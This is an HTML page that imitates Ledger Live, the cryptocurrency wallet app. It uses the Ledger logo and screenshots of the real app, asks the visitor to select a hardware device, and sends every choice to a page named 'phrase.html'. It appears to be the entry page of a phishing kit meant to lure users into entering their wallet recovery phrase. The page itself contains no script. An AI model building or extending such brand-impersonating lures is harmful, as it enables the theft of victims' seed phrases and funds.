<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title> Ledger Live </title>

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="favicon.png">

  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">

  <style>
    /* General Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Space Mono', monospace;
      background-color: #0d0c0c; /* Pure black */
      color: white;
      text-align: center;
      padding: 40px 20px;
      overflow-x: hidden;
    }

    /* Header */
    .logo {
      display: inline-block;
      padding: 6px 20px;
      border: 2px solid white;
      font-size: 18px;
      font-weight: 700;
      letter-spacing: 2px;
      margin-bottom: 10px;
    }

    h1 {
      font-size: 24px;
      font-weight: 700;
      letter-spacing: 3px;
      margin-bottom: 60px;
    }

    /* Devices Layout */
    .device-container {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      gap: 50px;
      flex-wrap: nowrap;
    }

    .device-card {
      background-color: #0d0c0c; /* match body exactly */
      border-radius: 20px;
      padding: 25px 20px 35px;
      width: 250px;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .device-card:hover {
      transform: translateY(-8px);
      box-shadow: 0 0 60px rgba(255, 255, 255, 0.08);
    }

    /* Image container */
    .image-container {
      width: 100%;
      height: 250px;
      background-color: #0d0c0c; /* same as background */
      display: flex;
      justify-content: center;
      align-items: center;
      border-radius: 14px;
    }

    .image-container img {
      width: 180px; /* slightly bigger image */
      height: auto;
      filter: brightness(1.1) contrast(1.1);
      mix-blend-mode: lighten; /* merge image + background */
    }

    /* Text + Button */
    .device-card h2 {
      font-size: 20px;
      margin-top: 25px;
      margin-bottom: 20px;
      font-weight: 700;
    }

    button {
      background: white;
      color: black;
      font-size: 16px;
      border: none;
      border-radius: 40px;
      padding: 12px 36px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.3s ease;
    }

    button:hover {
      background: #ccc;
    }

    @media (max-width: 1000px) {
      .device-container {
        flex-wrap: wrap;
        gap: 40px;
      }
    }
  </style>
</head>
<body>
  <header>
    <div class="logo">LEDGER</div>
    <h1>SELECT YOUR DEVICE</h1>
  </header>

  <section class="device-container">
    <div class="device-card">
      <div class="image-container">
        <img src="Screenshot 2025-11-08 at 01-57-28 Ledger Live.png" alt="Ledger Stax">
      </div>
      <h2>Ledger Stax</h2>
      <a href="phrase.html">
        <button>Select</button>
      </a>
    </div>

    <div class="device-card">
      <div class="image-container">
        <img src="Screenshot 2025-11-08 at 01-57-56 Ledger Live.png" alt="Ledger Flex">
      </div>
      <h2>Ledger Flex</h2>
      <a href="phrase.html">
        <button>Select</button>
      </a>
    </div>

    <div class="device-card">
      <div class="image-container">
        <img src="Screenshot 2025-11-08 at 01-58-33 Ledger Live.png" alt="Ledger Nano S Plus">
      </div>
      <h2>Ledger Nano S & Plus</h2>
      <a href="phrase.html">
        <button>Select</button>
      </a>
    </div>

    <div class="device-card">
      <div class="image-container">
        <img src="Screenshot 2025-11-08 at 01-59-01 Ledger Live.png" alt="Ledger Nano X">
      </div>
      <h2>Ledger Nano X</h2>
      <a href="phrase.html">
        <button>Select</button>
      </a>
    </div>
  </section>
</body>
</html>
